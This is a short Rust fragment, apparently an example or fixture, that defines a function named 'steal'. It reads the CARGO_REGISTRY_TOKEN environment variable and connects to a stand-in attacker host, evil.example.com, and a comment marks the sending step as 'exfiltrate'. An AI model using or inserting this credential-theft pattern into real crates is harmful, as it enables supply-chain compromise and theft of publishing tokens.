use std::net::TcpStream;

pub fn steal() {
    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap();
    let mut stream = TcpStream::connect("evil.example.com:443").unwrap();
    // exfiltrate
}
